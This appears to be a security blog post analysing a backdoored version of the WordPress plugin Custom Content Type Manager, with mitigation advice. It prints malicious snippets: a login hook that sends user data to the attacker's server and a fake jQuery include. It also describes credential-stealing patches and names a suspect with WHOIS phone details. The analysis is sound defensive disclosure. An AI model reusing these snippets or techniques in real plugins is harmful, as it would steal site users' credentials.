@@ -1,0 +1,168 @@
+When a WordPress Plugin Goes Bad
+
+Update March 7: The WordPress Directory team investigated and mitigated this issue by disconnecting the wooranker account from all plugins, reverting malicious changes in the CCTM plugin, and changing the version to 0.9.8.9. WordPress should automatically update to this new clean version.
+If your site was compromised during the timeframe while the backdoored version (0.9.8.8) was installed, updating to 0.9.8.9 is not enough to clean the site – Please check the Mitigation section at the end of this blogpost.
+
+Last summer we shared a story about the SweetCaptcha WordPress plugin injecting ads and causing malvertising problems for websites that leveraged the plugin. When this plugin was removed from the official WordPress Plugin directory, the authors revived another WordPress account with a long abandoned plugin and uploaded SweetCaptcha as a “new version” of that plugin.
+In the end of the SweetCaptcha saga, we gave this warning:
+It’s quite a common scenario when criminals try to hijack or buy developer accounts of legitimate applications, or pay their developers to add some malicious code into their software, so some benign plugin or application may turn bad after an update — the only thing that protects you is the author reputation and the security screening and approval process in the repository.
+This time we’ll tell you of another plugin that turned bad after an update.
+
+Backdoor in Custom Content Type Manager
+Custom Content Type Manager (CCTM) is a relatively popular plugin with three years of development, 10,000+ active installs, and a satisfaction rating of 4.8. It helps create custom post types. Website owners find the classical “blog format” too restrictive, use the plugin to add custom elements to their posts. So far so good.
+This week we cleaned one infected site and found a very suspicious auto-update.php file inside wp-content/plugins/custom-content-type-manager/.
+Backdoor in auto-update.php
+
+It’s a backdoor that can download files from hxxp://wordpresscore .com/plugins/cctm/update/ (the domain name is definitely very suspicious) and save them with the .php extension in the plugin directory.
+It looked like a typical backdoor that could be uploaded anywhere on a compromised server, not just in this particular plugin. We decided to check the original plugin package and, to our surprise, found the file in the source!  We also discovered that we were not the only ones that found this file (although people on the forum seemed to believe that the file was just “vulnerable”). This really was worth investigating.
+Plugin Revisions
+Every WordPress plugin that you find in the official Plugin Directory is being updated via the subversion repository. With help from the Trac issue tracking system, anyone can use this repository to find a lot of interesting information about who, when, and what changed in any version of any plugin. For example, these are the recent changes in the Custom Content Type Manager plugin:
+Latest revisions of the Custom Content Type Manager plugin
+One of the recent changes added the auto-update.php file on Feb 18th, 2016. In this update, “wooranker” made a change and added the following message: “small tweeks by new owner” (original grammar preserved).
+New Plugin Owner
+It appears the plugin has changed owners! Indeed, in the above screenshot, you can see that two weeks ago the plugin was still being updated by “fireproofsocks“. One of their last changes is described as “Adding wooranker to the readme.”  After that only wooranker updated the plugin.
+Was it a legitimate change by the owner? Maybe. All we know is that the plugin hadn’t been updated before that for ten months. Perhaps its developer lost interest in it and accepted an offer from wooranker. On the other hand, taking into account the malicious plugin update and the fact that fireproofsocks was inactive for nearly a year, we can suspect that wooranker could have hacked into the fireproofsocks account and added themselves as a new owner.
+Additionally, on Feb 5th, 2016, wooranker was also added as an owner to the Postie plugin. There had been many legitimate changes to the Postie plugin since then. All committed by its original author – WayneAllen. So, in this case the new owner was added with the original author’s consent. Puzzling, isn’t it? I have a theory about this. Before I share it with you, let’s return to the malicious CCTM plugin update and see how wooranker used it to hack sites.
+More Malicious Changes
+Trac also shows this interesting plugin update (Feb 19th, the latest change). It added the /includes/CCTM_Communicator.php file and inserted this new code into the plugin’s index.php.
+// Send plugin information when user login
+function _wp_login_eventhandler($user_login, $user) {
+require_once('includes/CCTM_Communicator.php');
+$_objCCTMCom = new CCTM_Communicator();
+$_objCCTMCom->addInfo(array($user_login, $user));
+$_objCCTMCom->send_info();
+}
+add_action('wp_login', '_wp_login_eventhandler', 10, 2);
+This code sends information about the site and the user to the wooranker’s server (wordpresscore .com) every time someone logs into the WordPress website. Although the user data doesn’t contain the user password in plain text, it’s good enough to compile a list of sites with the installed backdoored CCTM plugin. Similar information is also sent when the plugin is activated.
+Attack Scenario.
+Using access logs on the compromised site, we were able to reconstruct the whole attack.
+Knock-Knock
+On February 28th, someone from 104.131.27.120 (Digital Ocean) tried to use some Python script (“python-requests/2.2.1 CPython/2.7.6 Linux/3.13.0-79-generic“) to log into WordPress.
+The address of the site was apparently obtained via the new CCTM_Communicator feature.
+Probably the attacker tried to use the stolen admin username along with some common passwords. Those attempts were futile, because that site used a plugin that changed the login URL.
+Uploading More Backdoors
+A day later (Feb 29th), the attacker decided to use the auto-update.php backdoor. It helped them upload the c.php file into the plugin directory. The purpose of this new c.php is to create a more sophisticated attack shell wp-options.php in the site root directory. Once wp-options.php is created, the c.php file is automatically deleted.
+After that, wooranker used wp-options.php to “patch” three core WordPress files and create a new admin user with name “support” and the email address: “support@wordpresscore .com”
+“Patching” WordPress
+While CCTM_Communicator does steal user information, it lacks the user passwords. To work around this, wp-options.php “patches” three core files that work with user passwords in plain text:
+
+wp-login.php – the patch sends credentials of an authenticated admin users to hxxp://wordpresscore .com/in/login/index.php
+wp-admin/user-new.php – steals credentials of newly created users and sends them to hxxp://wordpresscore .com/in/add-user/index.php
+wp-admin/user-edit.php – steals credentials when someone changes a password and sends them to hxxp://wordpresscore .com/in/pass-change/index.php
+
+And in case of no user activity, this script also creates an extra admin user “support/ support@wordpresscore .com“.
+The new features of the version 0.9.8.8 of the Custom Content Type Manager plugin are:
+
+providing a backdoor to the site
+stealing credentials of the site users.
+
+No other new features/bug fixed were identified, so it’s hard to tell how it passed a review in the Plugin Directory.
+DonutJS
+There was one more minor change. The first thing wooranker changed after obtaining ownership of the plugin was adding some donutjs into includes/CCTM.php.
+wp_enqueue_script('donutjs', '//donutjs.com/jquery.js' );
+Looks like just another JavaScript library, right? Many plugins do it. However there’s something suspicious about it:
+
+Why would a plugin need to include a jquery.js script? WordPress does it by default.
+
+Moreover, why include the script from a third-party site that doesn’t seem to have anything to do with jQuery or with the well-known CDNs that host jQuery scripts? More often than not, this is a sign of a fake malicious jquery script.
+
+What is this donutjs anyway?
+
+Have you ever heard of DonutJS? There are very few results when you Google it. The most meaningful is this three-year-old Github project of a virtually unknown (2 watchers and no contributors) JS library that builds donut charts. A [“donutjs.com”] search returns even less results (34 for me), mostly from online services that provide information on any requested domains (rankings, keywords, WHOIS). By the way – the domain was registered just 6 months ago.
+The donutjs .com itself looks like it really provides some JavaScript library:
+Donut JS is a fast, lightweight, cross-platform framework
+for building incredible, powerful JavaScript applications.
+Donut JS vs Vanilla JS
+But if you read it carefully, you’ll notice that it’s fake.
+
+Donut JS code in comparison charts is pure vanilla JavaScript
+Links to DonutJS documentation and books lead to third-party generic JavaScript resources.
+Download button won’t work
+And of course this claim at the top of the site makes me laugh:
+
+In fact, Donut JS is already used on more websites than jQuery, Prototype JS, MooTools, YUI, and Google Web Toolkit – combined.
+
+DonutJS false claim to fame
+Funny, isn’t it? It should be, because donutjs .com is actually a slightly modified copy of the Eric Wastl‘s parody site vanilla-js.com where he compares vanilla JavaScript to popular frameworks.
+Tracking Instead of jQuery
+Okay, now we know that donutjs .com doesn’t have anything to do with any real JS libraries. So why did wooranker include the donutjs .com/jquery.js script? It’s definitely not jQuery. Here’s what this URL returns:
+DonutJS jqury.js source code
+It’s another tracking script that reports referrers to hxxps://donutjs .com/jquery-js.php.
+Why would someone want those referrers? The answer is they are useful to someone who injects this script into vulnerable sites — the referrers will provide them with addresses of the sites they can hack.
+So basically the donutjs script is a backup for the spying module in CCTM_Communicator that only works when someone logs into WordPress or activates the plugin.
+Wooranker + WordPresscore + Donutjs = …
+If the above is true, then wooranker should control donutjs. com. Well it seems to be the case. How do I know? Unlike other hackers, this guy doesn’t put much (if any) effort into hiding his identity.
+Let’s begin with WHOIS:
+wordpresscore .com
+Creation Date: 2015-11-23
+Registrant Name: Vishnudath Mangilipudi
+Admin State/Province: Andhra Pradesh
+Admin Postal Code: 524201
+Admin Country: IN
+Admin Phone: +91.8985005295
+Name Server: NS1.DIGITALOCEAN.COM
+Name Server: NS2.DIGITALOCEAN.COM
+Name Server: NS3.DIGITALOCEAN.COM
+donutjs .com
+Registrant Name: vishnudath
+Registrant Country: IN
+Registrant Phone: +91.8985005295
+trimtoroot .com
+104.131.98.166 – United States New York City Digital Ocean Inc.
+wp-options.php script contains references to “trimtoroot .com” that used to be a command & control server before wordpresscore .com.
+Registrant Name: Vishnudath Mangilipudi
+Registrant Organization:
+Name Server: NS1.DIGITALOCEAN.COM
+Name Server: NS2.DIGITALOCEAN.COM
+Name Server: NS3.DIGITALOCEAN.COM
+As you can see, all these domains are registered by some Vishnudath from Andhra Pradesh in India.
+A bit more Googling and we find a profile of a freelance designer “Vishnudath M” from India with nickwooranker – bingo!
+Digital Ocean
+We also see a strong connection to the Digital Ocean network. Some sites like trimtoroot .com are hosted there, other domains host their name servers there. Backdoors in the Custom Content Type Manager plugin were also accessed from the Digital Ocean network (104.131.27.120). Digital Ocean is more a developer choice than a hacker choice.
+Freelancer Comes to the Dark Side
+So we know that wooranker is an Indian graphics designer with pretty good technical knowledge who has his own VPS (droplets) on the Digital Ocean network. What else can we say about him?
+He definitely knows how WordPress works. Some of the code in the malicious plugin update looks pretty smart and makes creative use of WordPress API.
+He also probably works as a freelance WordPress developer and this may explain why the author of the second plugin, Postie, added wooranker as a plugin owner (I promised to shared my thoughts about it).
+He most likely supports and maintains some WordPress sites. In the wp-options.php attack shell that he uploaded after infection, I found some features that don’t have anything to do with malicious activity.
+For example, there is an option to install these three popular security plugins:
+
+Theme Authenticity Checker (TAC)
+Brute Force Login Protection
+and even our Sucuri Security
+
+It can also backup files and even update WordPress.
+Most likely it was initially created as a tool to maintain WordPress sites, update them, clean hacks, and protect them.
+Maybe he was making his living by bidding for such jobs on various freelance marketplace sites. Not the most profitable work. As he learned more and saw more infected and vulnerable websites, he probably wondered if there were more chances to make money on the other side…
+The wordpresscore .com domain was registered back in November with clearly malicious intent.
+And then, when the Postie plugin owner added him as an author, he learned about how the Plugin Directory worked and spotted its weaknesses. With a little luck, he managed to guess credentials of a seemingly abandoned plugin account, added his own wooranker account to it, and published the backdoored new version of the plugin which finished the transformation to the dark side.
+
+Of course, all this is nothing more than my speculations about the wooranker story. After all, this Vishnudath can be just a red herring that hides the identity of the real hacker.
+At this point it’s not clear what he wants to do with all of the hacked sites. But the beginning doesn’t leave hope that it will be something benign. Stemming from the wooranker username, I guess it may have something to do with black hat SEO.
+Who can we trust?
+This story raises some important questions:
+
+How much can we trust plugins that you download from the official WordPress Plugin Directory? Of course there are some screening process. but it can’t detect all tricky backdoors and new types of malware. With the huge number of plugins and updates, it’s just not feasible. Without reviewing the code of a plugin and its updates, you can trust a plugin no more than you can trust its author. How many plugin developers do you know and trust? Think about it next time when you install a new plugin or update already installed plugins.
+How much can we trust freelancers that we hire to do some minor maintenance jobs on our sites? You might be giving full access to someone who also “plays” for the “bad guys”. Do you make backups before you hire freelancers? Do you change all passwords and scan for backdoors when they finish their work?
+
+Mitigation
+If you are one of the unlucky site owners who upgraded the Custom Content Type Manager plugin to version 0.9.8.8 or installed it recently, here are the steps you should do (order matters):
+
+Deactivate the Custom Content Type Manager plugin.  Update Custom Content Type Manager to the new clean version (0.9.8.9)
+Check consistency of all core WordPress files. You can reinstall WordPress to achieve this. At least, make sure that the following three files are not modified (For WP 4.4.2 you can get the originals here):
+
+./wp-login.php
+./wp-admin/user-edit.php
+./wp-admin/user-new.php
+
+Now that you removed the credentials stealing code in the previous steps, change passwords of all WordPress users.
+Don’t forget to delete users that you don’t recognize. Especially the one with thesupport@wordpresscore .com email.
+Now remove wp-options.php in the root directory.
+
+Delete the Custom Content Type Manager plugin. If you really need it, get the last good version 0.9.8.6 here and disable automatic plugin updates until the malicious plugin versions are removed from the Plugin Directory. By the way, don’t install CCTM versions older than 0.9.8.6 either. They have a known security hole and we see hackers checking websites for this (along with many other vulnerabilities).
+
+You might also want to scan all other files and the database for “wordpresscore”. Just in case.
+
+As our real-world case shows, plugins that change WordPress login URLs not only save you from brute force attacks, but also help in cases when hackers steal admin credentials or manage to create fake admins. Restricting access to the admin area is also a good idea.
+And finally, make sure your site is being monitored for security issues.
+Awesome News for 11/17:
+The new WordPress Security Guide has now been released and in it you can learn about vulnerabilities and best practices to keep your website protected and secured.
